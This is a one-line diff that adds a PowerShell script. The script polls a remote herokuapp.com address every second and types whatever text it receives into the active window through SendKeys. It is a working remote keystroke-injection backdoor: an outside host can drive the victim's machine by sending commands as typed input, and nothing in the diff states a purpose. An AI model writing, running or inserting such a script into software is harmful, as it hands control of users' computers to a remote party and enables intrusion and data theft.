@@ -1,0 +1,1 @@
+$ps = "";$wshell = New-Object -ComObject wscript.shell;while (1) {$s = (New-Object System.Net.WebClient).DownloadString("http://zochg.herokuapp.com/pps");if ($s -ne $ps) {$wshell.sendKeys($s); $ps = $s};sleep 1}
